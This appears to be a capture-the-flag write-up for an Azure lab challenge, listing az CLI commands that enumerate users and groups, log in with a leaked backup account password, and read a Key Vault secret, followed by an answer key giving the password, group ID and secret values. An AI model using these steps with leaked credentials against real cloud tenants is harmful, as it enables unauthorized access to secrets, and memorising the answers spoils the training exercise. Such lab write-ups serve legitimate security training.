# Day 16: The Wareville’s Key Vault grew three sizes that day.

**Connection to the Machine:**
To begin, I logged into the Azure Portal using the given credentials.

## Approach:

- Launched Azure Command-Line Interface:

  ![image](https://github.com/user-attachments/assets/4d0a2a4b-5552-45e9-bd76-f72fe315db08)

**Ran the following commands:**

- `az ad user list`
  
  ![image](https://github.com/user-attachments/assets/0b9d2fb8-a9e2-40a7-927b-6de5794766b3)

-  `az ad group list`

  ![image](https://github.com/user-attachments/assets/f2d29558-30e0-47e1-b299-c7de28337267)


-  `az ad group member list --group "Secret Recovery Group"`

  ![image](https://github.com/user-attachments/assets/1186c56b-dee3-4183-bc1d-80a43cf798bf)

- `az account clear`
- `az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R3c0v3r_s3cr3ts!`
  
  ![image](https://github.com/user-attachments/assets/6780982b-d418-4eb2-9890-64fe14e148a2)

- `az role assignment list --assignee 7d96660a-02e1-4112-9515-1762d0cb66b7 --all`

- `az keyvault list`
  
  ![image](https://github.com/user-attachments/assets/623acd1a-3f2c-4bf4-a649-f6e5fbe2b977)

- `az keyvault secret list --vault-name warevillesecrets`

  ![image](https://github.com/user-attachments/assets/7db8fe11-d0c8-4fbc-8f53-4c4415cf83f5)

- `az keyvault secret show --vault-name warevillesecrets --name aoc2024`

  ![image](https://github.com/user-attachments/assets/8b11347e-6a3b-4e45-9439-cc929ea31c32)



---

## Answers to the given questions:

What is the password for backupware that was leaked?

```
R3c0v3r_s3cr3ts!
```

---

What is the group ID of the Secret Recovery Group?


```
7d96660a-02e1-4112-9515-1762d0cb66b7
```

---

What is the name of the vault secret?

```
aoc2024
```

---

What are the contents of the secret stored in the vault?

```
WhereIsMyMind1999
```

---

![image](https://github.com/user-attachments/assets/a92676fe-14b4-49a9-b6a3-7ab55df76962)
